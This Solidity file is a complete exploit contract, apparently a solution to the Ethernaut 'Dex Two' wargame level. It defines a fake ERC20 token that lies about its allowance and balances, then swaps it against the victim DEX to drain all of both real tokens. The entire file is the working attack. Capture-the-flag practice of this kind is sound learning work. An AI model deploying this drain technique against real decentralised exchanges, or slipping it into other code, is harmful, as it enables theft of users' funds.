// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/23-IDexTwo.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract DexTwoAttack is ERC20 {
    IDexTwo public immutable victimDexTwo;

    constructor(IDexTwo victimDexTwo_) ERC20("", "") {
        _mint(
            address(this),
            victimDexTwo_.balanceOf(
                victimDexTwo_.token2(),
                address(victimDexTwo_)
            ) * 2
        );

        victimDexTwo = victimDexTwo_;
    }

    function allowance(
        address, /* owner */
        address /* spender */
    ) public pure override returns (uint256) {
        return type(uint256).max;
    }

    function balanceOf(
        address /* account */
    ) public view override returns (uint256) {
        return victimDexTwo.balanceOf(victimDexTwo.token2(), msg.sender);
    }

    function attack() external {
        ISwappableTokenTwo[2] memory tokens = [
            ISwappableTokenTwo(victimDexTwo.token1()),
            ISwappableTokenTwo(victimDexTwo.token2())
        ];

        for (uint256 i; i < tokens.length; ) {
            victimDexTwo.swap(
                address(this),
                address(tokens[i]),
                tokens[i].balanceOf(address(victimDexTwo))
            );

            require(
                0 == tokens[i].balanceOf(address(victimDexTwo)),
                "DexTwo: Attack failed"
            );

            unchecked {
                ++i;
            }
        }
    }
}
